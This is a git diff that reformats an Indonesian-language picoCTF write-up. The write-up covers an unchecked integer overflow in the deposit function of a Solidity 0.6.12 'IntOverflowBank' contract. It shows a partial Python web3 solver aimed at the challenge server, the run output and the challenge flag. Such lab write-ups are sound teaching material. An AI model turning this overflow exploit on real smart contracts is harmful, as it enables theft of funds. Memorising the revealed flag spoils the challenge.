@@ -18,6 +18,7 @@ NOTE: this server can take up to 5 minutes to start up. Please be patient.
 
 diberikan IntOverflowBank.sol yang berisi
 
+```
 pragma solidity ^0.6.12;
 
 contract IntOverflowBank {
@@ -66,9 +67,11 @@ contract IntOverflowBank {
         return flag;
     }
 }
+```
 
 Pada versi solidity versi 0.6.12 ini belum memiliki proteksi overflow otomatis. sehingga jika dilihat pada kode lebih tepatnya fungsi deposit 
 
+```
 function deposit(uint256 amount) external {
         uint256 oldBalance = balances[msg.sender];
         balances[msg.sender] = balances[msg.sender] + amount; // Baris krusial
@@ -79,11 +82,13 @@ function deposit(uint256 amount) external {
             emit FlagRevealed(flag);
         }
     }
+```
 
 Kerentanan terjadi pada balances[msg.sender] + amount. Karena variabel bertipe uint256, nilai maksimum yang dapat ditampung adalah 2^256 - 1. Jika kita menambahkan angka sedemikian sehingga hasil penjumlahannya melebihi nilai tersebut, akan terjadi oveflow dan nilainya akan kembali ke angka yang sangat kecil.
 
 Tujuannya dalah membuat balances[msg.sender] < amount bernilai true. sehingga untuk mengeksploitnya menggunakan python dengan library web3 seperti solver berikut
 
+```
 from web3 import Web3
 
 rpc_url = "http://mysterious-sea.picoctf.net:59295"
@@ -132,6 +137,7 @@ def run_exploit():
 
 if __name__ == "__main__":
     run_exploit()
+```
 
 Sehingga ketika dijalankan akan menghasilkan 
 
@@ -141,4 +147,4 @@ Transaksi terkirim: b7b21226f35717ee89c01b44bc139cf17c2c3f6cc34aaa097ec08fc5ffb7
 Deposit overflow berhasil!
 Flag berhasil didapatkan: picoCTF{Sm4r7_OverFL0ws_ExI5t_a14a9783}
 
-# Flag: picoCTF{Sm4r7_OverFL0ws_ExI5t_a14a9783}
+### Flag: `picoCTF{Sm4r7_OverFL0ws_ExI5t_a14a9783}`
